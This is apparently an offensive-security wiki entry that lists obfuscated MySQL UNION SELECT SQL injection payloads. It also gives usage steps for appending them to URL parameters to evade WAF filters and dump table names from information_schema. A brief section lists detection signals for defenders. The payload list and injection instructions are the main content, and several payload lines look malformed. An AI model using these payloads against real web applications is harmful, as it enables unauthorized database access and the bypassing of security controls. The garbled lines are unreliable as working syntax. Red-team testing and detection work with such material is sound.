---
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:36.798415+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Web
tags:
  - sql-injection
  - obfuscation
  - mysql
validated: true
---

# MySQL-Union-Select-Obfuscation-Examples

## Code

```sql
1.UNION	SELECT	2	
3.2UNION	SELECT	2	
1e0UNION	SELECT	2	
SELECT\N/0.e3UNION	SELECT	2	
1e1AND-0.0UNION	SELECT	2	
1/*!12345UNION/*!31337SELECT/*!table_name*/	
{ts	1}UNION	SELECT.``	1.e.table_name	
SELECT	$.``	1.e.table_name	
SELECT{_ 	.``1.e.table_name}	
SELECT	LightOS	.	``1.e.table_name	LightOS	
SELECT	information_schema 1337.e.tables	13.37e.table_name	
SELECT	1	from	information_schema 9.e.table_name
```

## Description

This code snippet contains multiple obfuscated UNION SELECT payloads designed for MySQL databases. These variations use techniques like inline comments (/*! */), hexadecimal notation (1e0), backticks, and unusual spacing to evade WAF filters while combining query results to extract data from information_schema tables.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| table_name | Target column or table to query (e.g., from information_schema) | table_name |
| 1,2,3 | Placeholder values matching original query columns | NULL or column selectors |

## Usage

Inject these payloads into vulnerable parameters in web requests (e.g., via curl or Burp Suite) after determining column count. For example, append to a URL: ?id=1' [payload] --. Use in union-based SQLi to dump schema: replace placeholders with SELECT table_name FROM information_schema.tables. Ideal for bypassing keyword-based WAF rules in red team engagements targeting MySQL-backed apps.

## Detection

- WAF logs showing blocked SQL keywords followed by successful requests with obfuscated variants.
- Database query logs revealing UNION operations on system schemas.
- Application logs with anomalous response sizes or content including database metadata.
- Network traffic analysis for repeated requests to the same endpoint with varying payloads.

## Related

- [[procedures/Union-Based-SQL-Injection-with-DBMS-Obfuscation]]
- [[tools/sqlmap]]
